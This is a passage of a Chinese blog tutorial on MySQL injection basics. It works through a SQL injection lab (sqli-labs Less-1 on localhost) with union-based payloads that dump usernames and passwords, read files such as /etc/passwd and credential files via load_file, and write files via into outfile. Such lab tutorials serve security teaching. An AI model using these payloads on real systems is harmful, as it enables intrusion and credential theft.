+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-28.png" alt="mysql-28"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;users&apos;  #查列</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-29.png" alt="mysql-29"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=0x7573657273  #可以使用16进制的形式进行查询</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-30.png" alt="mysql-30"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select uesrname,password from security.users  #查询数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-31.png" alt="mysql-31"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select uesrname,password from security.users limit 0，1  #当显示位不能显示多个数据时可以使用limit逐个显示</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-32.png" alt="mysql-32"></p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-33.png" alt="mysql-33"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata  #当显示位不能显示多个数据可使用group_concat进行多个数据显示</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-34.png" alt="mysql-34"></p>
+<h3 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h3><p>使用sqli_lab第一关作为测试环境</p>
+<h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p><code>&#39; and &#39;1&#39;=&#39;1</code>显示正确</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-36.png" alt="mysql-36"></p>
+<p><code>&#39; and &#39;1&#39;=&#39;2</code>显示错误，判断存在注入</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-37.png" alt="mysql-37"></p>
+<p><code>order by 3</code>显示正确</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-38.png" alt="mysql-38"></p>
+<p><code>order by 4</code>显示错误，判断为3列</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-39.png" alt="mysql-39"></p>
+<p><code>-1&#39; union select 1,2,3 --+</code>查看显示位，-1为了前面数据不进行显示，显示1，2，3之中的数据</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-40.png" alt="mysql-40"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select schema_name from information_schema.schemata) --+  ##查看数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-41.png" alt="mysql-41"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select schema_name from information_schema.schemata limit 0,1) --+  #显示位不足，使用limit查看数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-42.png" alt="mysql-42"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+  #显示位不足，使用group_concat查看数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-43.png" alt="mysql-43"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)--+ #16进制</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-44.png" alt="mysql-44"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)--+ #查看表</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-47.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username) from security.users)--+  #查看数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-48.png" alt="mysql-46"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username,password) from security.users)--+ #查看数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-49.png" alt="mysql-49"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+  #加入0x7e友好显示</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-50.png" alt="mysql-50"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)—-+ #limit逐条显示</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-51.png" alt="mysql-51"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select user())--+ #查看当前用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-52.png" alt="mysql-52"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select database())--+  #查看当前数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-53.png" alt="mysql-53"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;var/www/html/sql-connections/db-creds.inc&apos;))--+  #读取文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-54.png" alt="mysql-54"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;/var/www/html/Less-1/index.php&apos;))--+  #读取文件，php代码需要右键查看源代码</span><br><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(0x2f7661722f7777772f68746d6c2f4c6573732d312f696e6465782e706870))--+  #16进制方式读取文件</span><br></pre></td></tr></table></figure>
+
+<p><em>注：</em>路径符号<code>\</code>错误，<code>\\</code>正确，<code>/</code>正确，转换16进制就不需要<code>&#39;&#39;</code></p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-55.png" alt="mysql-55"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select load_file(&apos;/etc/passwd&apos;))--+  #读取文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-56.png" alt="mysql-56"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&apos; union select 1,2,(select &apos;123&apos; into outfile &apos;/var/www/1.php&apos;)--+  #写入文件，路径可以使用16机制，由于权限原因，此处无法写入</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-57.png" alt="mysql-57"></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/01/16/Mysql注入基础/" title="Mysql注入基础">https://choge.top/2020/01/16/Mysql注入基础/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/mysql/" rel="tag"># mysql</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/01/02/Android安全之刷机/" rel="next" title="Android安全之刷机">
+                  <i class="fa fa-chevron-left"></i> Android安全之刷机
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/01/16/Mysql之union注入、报错注入/" rel="prev" title="Mysql之union注入、报错注入">
+                  Mysql之union注入、报错注入 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql内置函数"><span class="nav-number">1.</span> <span class="nav-text">Mysql内置函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql常用函数"><span class="nav-number">2.</span> <span class="nav-text">Mysql常用函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#部分函数测试"><span class="nav-number">2.1.</span> <span class="nav-text">部分函数测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql运算符"><span class="nav-number">3.</span> <span class="nav-text">Mysql运算符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#算术运算符："><span class="nav-number">3.1.</span> <span class="nav-text">算术运算符：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比较运算符："><span class="nav-number">3.2.</span> <span class="nav-text">比较运算符：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逻辑运算符："><span class="nav-number">3.3.</span> <span class="nav-text">逻辑运算符：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#部分运算符测试"><span class="nav-number">3.4.</span> <span class="nav-text">部分运算符测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#万能密码"><span class="nav-number">3.5.</span> <span class="nav-text">万能密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入流程"><span class="nav-number">4.</span> <span class="nav-text">SQL注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL内置库（-gt-5-7）"><span class="nav-number">4.1.</span> <span class="nav-text">MySQL内置库（&gt;=5.7）:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询语句核心语法"><span class="nav-number">4.2.</span> <span class="nav-text">查询语句核心语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#部分查询语句测试"><span class="nav-number">4.3.</span> <span class="nav-text">部分查询语句测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入实战"><span class="nav-number">4.4.</span> <span class="nav-text">SQL注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#判断是否存在注入"><span class="nav-number">4.4.1.</span> <span class="nav-text">判断是否存在注入</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
